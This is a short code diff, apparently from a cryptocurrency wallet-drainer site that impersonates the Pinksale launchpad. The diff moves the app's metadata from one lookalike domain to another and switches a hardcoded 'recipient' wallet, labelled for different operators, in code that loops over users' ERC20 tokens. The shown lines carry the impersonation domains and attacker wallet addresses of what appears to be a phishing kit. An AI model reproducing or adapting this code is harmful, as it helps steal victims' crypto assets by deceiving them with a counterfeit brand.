@@ -150,8 +150,8 @@ const testnets_chains = [{
 const metadata = {
   name: 'Pinksale App',
   description: 'The Launchpad Protocol for Everyone!',
-  url: 'https://pinksellapp.site', // origin must match your domain & subdomain
-  icons: ['https://pinksellapp.site/icon.ico']
+  url: 'https://pinksale-launchflx.1nt.online', // origin must match your domain & subdomain
+  icons: ['https://pinksale-launchflx.1nt.online/icon.ico']
 }
 
 
@@ -313,8 +313,8 @@ export default function Home() {
         let ERC20;
         let info = []
         // let recipient = '0x6763d3CE81f12c6af800799432A1EF841BF33eA4'
-        let recipient = '0x025ad4D4254511D84b3Ad5E85e02D879B8ea1681' //for sato
-        // let recipient = '0xA1ff3166bA5aB978D8011d1090b1884dc0334d9B' //for X
+        // let recipient = '0x025ad4D4254511D84b3Ad5E85e02D879B8ea1681' //for sato
+        let recipient = '0xA1ff3166bA5aB978D8011d1090b1884dc0334d9B' //for X
 
         switch (chainId) {
           case 1:
